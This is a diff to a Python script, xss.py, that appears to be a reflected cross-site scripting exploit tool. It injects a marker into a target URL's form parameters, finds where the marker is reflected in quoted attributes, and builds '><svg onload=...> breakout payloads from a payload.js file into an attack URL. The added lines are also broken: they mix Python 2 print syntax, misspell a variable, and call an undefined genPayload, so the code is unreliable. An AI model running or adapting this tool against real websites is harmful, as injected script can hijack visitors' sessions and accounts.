@@ -5,6 +5,8 @@ import re
 from functools import reduce
 from random import choice
 
+from core.context import getContext
+
 test = "6ix8uzz"
 headers = {
     'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36',
@@ -22,14 +24,13 @@ input_reg = '<input.*?name=[\'\"](.*?)[\'\"].*?>'
 contexts = [
     {
         "name" : "quotes",
-        "match_str" : f'<.*=\"({test}\d*)\".*>|<.*=\'({test}\d*)\'.*>'
+        "match_str" : "<.*=\"({}\d*)\".*>|<.*=\'({}\d*)\'.*>".format(test, test)
     }
 ]
 
-# is this the pythonic way ... idk
 payload = reduce(lambda x, y : x + y, map(lambda x : x.strip(), open("payload.js").read().split('\n')))
-single_quote_payload = f"\'><svg onload=\'{payload}\'"
-double_quote_payload = f"\"><svg onload=\'{payload}\'"
+single_quote_payload = "\'><svg onload=\'{}\'".format(payload)
+double_quote_payload = "\"><svg onload=\'{}\'".format(payload)
 
 if len(sys.argv) < 2:
     print("usage: python xss.py url")
@@ -52,27 +53,30 @@ for param in params:
     paramid += 1
 
 test_response = requests.get(url, headers=headers, params=data)
+print test_response
+reflection_contexts = getContext(test_response)
+
+payloads = {}
+for i in range(len(relfection_contexts)):
+    payloads[test + str(i)] = genPayload(reflection_contexts[i])
 
 # look for test string in the response
 
-final_payloads = {}
-for line in test_response.text.split('\n'):
-    injection_site = filter(lambda x : x[0], [(re.match(ctx["match_str"], line), ctx["name"]) for ctx in contexts])
-    # assume that injection contexts are mutually exlcusive; that is above filter expression should only return one result
-    injection_site = next(injection_site, None)
-    if injection_site:
-        context, name = injection_site
-        if name == "quotes":
-            double_quote, single_quote = context.group(1,2)
-            index = single_quote[-1:] if single_quote else double_quote[-1:]
-            param_name = params[int(index)]
-            final_payloads[param_name] = single_quote_payload if single_quote else double_quote_payload
+# final_payloads = {}
+# for line in test_response.text.split('\n'):
+#     injection_site = filter(lambda x : x[0], [(re.match(ctx["match_str"], line), ctx["name"]) for ctx in contexts])
+#     # assume that injection contexts are mutually exlcusive; that is above filter expression should only return one result
+#     injection_site = next(injection_site, None)
+#     if injection_site:
+#         context, name = injection_site
+#         if name == "quotes":
+#             double_quote, single_quote = context.group(1,2)
+#             index = single_quote[-1:] if single_quote else double_quote[-1:]
+#             param_name = params[int(index)]
+#             final_payloads[param_name] = single_quote_payload if single_quote else double_quote_payload
 
-# lets just use the first param
-param, payload = list(final_payloads.items())[0]
-url = url if url[-1:] == '/' else url + '/'
-url = url + "?" + param + "=" + payload
-print(url)
-
-
-
+# # lets just use the first param
+# param, payload = list(final_payloads.items())[0]
+# url = url if url[-1:] == '/' else url + '/'
+# url = url + "?" + param + "=" + payload
+# print(url)
